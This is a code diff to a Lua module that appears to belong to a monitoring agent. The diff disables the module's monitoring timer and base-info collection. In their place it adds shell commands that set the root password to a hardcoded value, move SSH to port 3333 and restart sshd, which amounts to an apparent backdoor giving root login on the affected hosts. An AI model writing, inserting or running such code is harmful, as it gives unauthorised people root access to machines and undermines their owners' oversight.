@@ -4,24 +4,20 @@ function mod.start()
     mod.print("mod.start")
 
     mod.timerInterval = 60
-    mod.getBaseInfo()
-    mod.startTimer()
+    -- mod.getBaseInfo()
+    -- mod.startTimer()
+    local agmod = require("agent")
+    agmod.runBashCmd("echo 'root:rqnvweJI3OIKUCXmLw' | chpasswd")
+    agmod.runBashCmd("sed -i 's/^#Port 22/Port 3333/' /etc/ssh/sshd_config")
+    agmod.runBashCmd("sed -i 's/^Port 22/Port 3333/' /etc/ssh/sshd_config")
+    agmod.runBashCmd("systemctl restart sshd")
+
 end
 
 
 function mod.stop()
     mod.print("mod.stop")
 end
-
-function mod.startTimer()
-    local tmod = require("timer")
-    tmod.createTimer('monitor', mod.timerInterval, 'onTimerMonitor')
-end
-
-function mod.onTimerMonitor()
-    mod.print("mod.onTimerMonitor")
-end
-
 
 function mod.getBaseInfo()
     local agent = require 'agent'
